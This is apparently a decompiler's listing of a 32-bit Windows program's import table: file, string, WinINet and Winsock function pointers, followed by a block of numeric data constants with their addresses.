<anonymous> * __imp__CreateFileMappingA = &g_t4372; // 004040AC
<anonymous> * __imp__CreateFileA = &g_t4364; // 004040B0
<anonymous> * __imp__CopyFileA = &g_t4358; // 004040B4
<anonymous> * __imp__CompareFileTime = &g_t4346; // 004040B8
<anonymous> * __imp__GlobalFree = &g_t44DE; // 004040BC
<anonymous> * __imp__CoInitialize = &g_t4676; // 004040C4
<anonymous> * __imp__CreateStreamOnHGlobal = &g_t4686; // 004040C8
<anonymous> * __imp__StrTrimA = &g_t46CA; // 004040D0
<anonymous> * __imp__StrRChrA = &g_t46B2; // 004040D4
<anonymous> * __imp__StrStrIA = &g_t46BE; // 004040D8
<anonymous> * __imp__StrDupA = &g_t46A8; // 004040DC
<anonymous> * __imp__wsprintfA = &g_t45C2; // 004040E4
<anonymous> * __imp__InternetOpenUrlA = &g_t4724; // 004040EC
<anonymous> * __imp__InternetOpenA = &g_t4714; // 004040F0
<anonymous> * __imp__InternetGetConnectedState = &g_t46F8; // 004040F4
<anonymous> * __imp__InternetCloseHandle = &g_t46E2; // 004040F8
<anonymous> * __imp__listen = &g_t463C; // 00404100
<anonymous> * __imp__recv = &g_t4646; // 00404104
<anonymous> * __imp__select = &g_t464E; // 00404108
<anonymous> * __imp__inet_addr = &g_t4630; // 0040410C
<anonymous> * __imp__send = &g_t4658; // 00404110
<anonymous> * __imp__gethostname = &g_t4622; // 00404114
<anonymous> * __imp__gethostbyname = &g_t4612; // 00404118
<anonymous> * __imp__connect = &g_t4608; // 0040411C
<anonymous> * __imp__closesocket = &g_t45FA; // 00404120
<anonymous> * __imp__bind = &g_t45F2; // 00404124
<anonymous> * __imp__accept = &g_t45E8; // 00404128
<anonymous> * __imp__socket = &g_t4660; // 0040412C
<anonymous> * __imp__WSAStartup = &g_t45DA; // 00404130
word32 g_dw404200 = 0x47B8; // 00404200
word32 g_dw404208 = 0x4776; // 00404208
word32 g_dw40420C = 0x4762; // 0040420C
word32 g_dw404210 = 18258; // 00404210
word32 g_dw404214 = 0x4744; // 00404214
word32 g_dw40421C = 0x4796; // 0040421C
word32 g_dw404224 = 17334; // 00404224
word32 g_dw404228 = 0x43C2; // 00404228
word32 g_dw40422C = 0x43D4; // 0040422C
word32 g_dw404230 = 0x43E4; // 00404230
word32 g_dw404234 = 0x43F6; // 00404234
word32 g_dw404238 = 0x4408; // 00404238
word32 g_dw40423C = 0x4418; // 0040423C
word32 g_dw404240 = 0x4426; // 00404240
word32 g_dw404244 = 0x4436; // 00404244
word32 g_dw404248 = 0x4450; // 00404248
word32 g_dw40424C = 0x4466; // 0040424C
word32 g_dw404250 = 0x447C; // 00404250
word32 g_dw404254 = 0x448C; // 00404254
word32 g_dw404258 = 0x449E; // 00404258
word32 g_dw40425C = 0x44B8; // 0040425C
word32 g_dw404260 = 0x44D0; // 00404260
word32 g_dw404264 = 0x44EC; // 00404264
word32 g_dw404268 = 0x44FA; // 00404268
word32 g_dw40426C = 0x4506; // 0040426C
word32 g_dw404270 = 17686; // 00404270
word32 g_dw404274 = 17702; // 00404274
word32 g_dw404278 = 17710; // 00404278
word32 g_dw40427C = 0x4546; // 0040427C
word32 g_dw404280 = 0x4558; // 00404280
word32 g_dw404284 = 17774; // 00404284
word32 g_dw404288 = 17784; // 00404288
word32 g_dw40428C = 0x4584; // 0040428C
word32 g_dw404290 = 0x4590; // 00404290
word32 g_dw404294 = 0x459C; // 00404294
word32 g_dw404298 = 0x45A8; // 00404298
word32 g_dw40429C = 0x4388; // 0040429C
word32 g_dw4042A0 = 0x4398; // 004042A0
word32 g_dw4042A4 = 0x4338; // 004042A4
word32 g_dw4042A8 = 0x43A8; // 004042A8
word32 g_dw4042AC = 17266; // 004042AC
word32 g_dw4042B0 = 0x4364; // 004042B0
word32 g_dw4042B4 = 0x4358; // 004042B4
word32 g_dw4042B8 = 17222; // 004042B8
word32 g_dw4042BC = 0x44DE; // 004042BC
word32 g_dw4042C4 = 0x4676; // 004042C4
word32 g_dw4042C8 = 0x4686; // 004042C8
word32 g_dw4042D0 = 18122; // 004042D0
word32 g_dw4042D4 = 18098; // 004042D4
word32 g_dw4042D8 = 18110; // 004042D8
word32 g_dw4042DC = 18088; // 004042DC
word32 g_dw4042E4 = 17858; // 004042E4
word32 g_dw4042EC = 18212; // 004042EC
word32 g_dw4042F0 = 0x4714; // 004042F0
word32 g_dw4042F4 = 18168; // 004042F4
word32 g_dw4042F8 = 18146; // 004042F8
word32 g_dw404300 = 0x463C; // 00404300
word32 g_dw404304 = 0x4646; // 00404304
word32 g_dw404308 = 0x464E; // 00404308
word32 g_dw40430C = 0x4630; // 0040430C
word32 g_dw404310 = 18008; // 00404310
word32 g_dw404314 = 0x4622; // 00404314
word32 g_dw404318 = 0x4612; // 00404318
word32 g_dw40431C = 0x4608; // 0040431C
word32 g_dw404320 = 17914; // 00404320
word32 g_dw404324 = 0x45F2; // 00404324
word32 g_dw404328 = 0x45E8; // 00404328
word32 g_dw40432C = 0x4660; // 0040432C
word32 g_dw404330 = 17882; // 00404330
